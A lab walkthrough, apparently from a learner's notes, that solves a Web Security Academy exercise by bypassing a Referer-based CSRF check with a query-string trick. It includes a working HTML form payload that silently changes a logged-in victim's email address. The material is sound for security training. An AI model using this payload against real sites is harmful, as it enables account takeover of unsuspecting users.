# CSRF with brokwn Referer validation
* This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross doamin requests, but the detection mechanism can be bypassed.
	* To solve this lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
	* You can log in to your own account using the following credentials: `wiener:peter`

### 1. Capture the request when use the "Upadte email" function
* Then, send it to repeater

![31](https://user-images.githubusercontent.com/53956303/153690851-f4c4a92c-b297-4643-9d19-35e0dc992049.png)
### 2. Copy the original domain and append it to the Referer header
```http
Referer: https://testingDomain.net?ac141f731e3e077ec040533e0099001f.web-security-academy.net
```
* Then, send the request
	* it accept the request but a parameter is missing.

![32](https://user-images.githubusercontent.com/53956303/153690989-e0b34fd2-ab83-4d86-8dba-b084d85014ca.png)
* The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
### 3. Create a Malicious CSRF HTML on the provided exploit server
* Add `history.pushState("", "", "/?your-lab-id.web-security-academy.net")` to cause the Referer haeder in the geneated request to contain the URL of the target site in the query string. 
```html
<form method="POST" action="https://ac141f731e3e077ec040533e0099001f.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="refererpresent@pwned.com">
</form>
<script>
        history.pushState("", "", "/?ac141f731e3e077ec040533e0099001f.web-security-academy.net")
        document.forms[0].submit();
</script>
```
* Also put `Referrer-Policy: unsafe-url` to avoid some browsers now strip the query string from the Referer header by default as a security measure. 
  * Use this to override this behavior and ensure that the full URL is included in the request.

![33](https://user-images.githubusercontent.com/53956303/153691634-2960b4c5-5247-4a7b-9f7e-5d71ba3cc719.png)
* Store and deliver the exploit to victim
	* As a result, the lab is solved

![34](https://user-images.githubusercontent.com/53956303/153691661-ca1e73c3-de44-407b-bb94-1aab00b3bac9.png)
